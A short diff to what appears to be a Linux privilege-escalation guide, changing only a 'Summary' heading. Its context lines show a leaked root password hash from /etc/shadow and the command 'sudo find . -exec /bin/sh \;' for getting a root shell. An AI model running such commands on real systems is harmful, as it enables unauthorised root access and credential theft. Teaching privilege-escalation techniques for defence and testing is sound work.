@@ -227,7 +227,8 @@ Abusing Intended Functionality
     Syntax error on line 1 of /etc/shadow:
     Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
 ---
-Summary
+Summary:
+
 sudo Privileges: If a user has sudo access to certain commands (like find, nano, or less), they might be able to escalate their privileges.
 
 Exploit via sudo: Using sudo find . -exec /bin/sh \; or exploiting misconfigurations with common binaries, an attacker could gain root access.
